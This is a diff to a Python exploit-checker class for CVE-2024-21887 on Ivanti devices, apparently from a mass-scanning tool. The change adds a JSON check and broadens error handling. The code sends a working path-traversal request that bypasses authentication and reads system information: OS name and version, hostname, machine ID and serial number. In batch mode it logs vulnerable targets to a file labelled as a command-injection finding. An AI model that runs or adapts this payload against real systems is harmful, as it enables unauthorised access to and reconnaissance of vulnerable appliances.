@@ -15,24 +15,26 @@ class Cve_2024_21887:
             if response.status_code == 403 and len(response.text) == 0:
                 final_url = f"{url}/api/v1/totp/user-backup-code/%2e%2e/%2e%2e/system/system-information"
                 system_info = requests.get(final_url, verify=self.ssl,headers=self.headers, proxies=self.proxy)
-                if not self.batch:
-                    OutPrintInfoSuc("Ivanti","Target is VULNERABLE")
-                    OutPrintInfo("Ivanti","SYSTEM INFORMATION")
-                    OutPrintInfo("Ivanti","--------------------------")
-                    system_info_json = system_info.json()
-                    OutPrintInfo("Ivanti","OS NAME:       " + system_info_json["rollback-partition-information"]["os-name"])
-                    OutPrintInfo("Ivanti","OS VERSION:    " + system_info_json["rollback-partition-information"]["os-version"])
-                    OutPrintInfo("Ivanti","HOSTNAME:      " + system_info_json["system-information"]["host-name"])
-                    OutPrintInfo("Ivanti","MACHINE ID:    " + system_info_json["system-information"]["machine-id"])
-                    OutPrintInfo("Ivanti","SERIAL NUMBER: " + system_info_json["system-information"]["serial-number"])
-                else:
-                    OutPrintInfoSuc("Ivanti", f'目标存在漏洞: {url}')
-                    OutPutFile("ivanti_policy_secure_rce.txt",f'目标存在Ivanti policy secure 命令注入漏洞: {url}')
+                system_info_json = system_info.json()
+                if system_info_json:
+                    if not self.batch:
+                        OutPrintInfoSuc("Ivanti","Target is VULNERABLE")
+                        OutPrintInfo("Ivanti","SYSTEM INFORMATION")
+                        OutPrintInfo("Ivanti","--------------------------")
+                        system_info_json = system_info.json()
+                        OutPrintInfo("Ivanti","OS NAME:       " + system_info_json["rollback-partition-information"]["os-name"])
+                        OutPrintInfo("Ivanti","OS VERSION:    " + system_info_json["rollback-partition-information"]["os-version"])
+                        OutPrintInfo("Ivanti","HOSTNAME:      " + system_info_json["system-information"]["host-name"])
+                        OutPrintInfo("Ivanti","MACHINE ID:    " + system_info_json["system-information"]["machine-id"])
+                        OutPrintInfo("Ivanti","SERIAL NUMBER: " + system_info_json["system-information"]["serial-number"])
+                    else:
+                        OutPrintInfoSuc("Ivanti", f'目标存在漏洞: {url}')
+                        OutPutFile("ivanti_policy_secure_rce.txt",f'目标存在Ivanti policy secure 命令注入漏洞: {url}')
             else:
                 if not self.batch:
                     OutPrintInfo("Ivanti","Target is NOT VULNERABLE")
 
-        except requests.RequestException as e:
+        except Exception as e:
             if not self.batch:
                 OutPrintInfo("Ivanti",f"Error: {e}")
     def main(self,target):
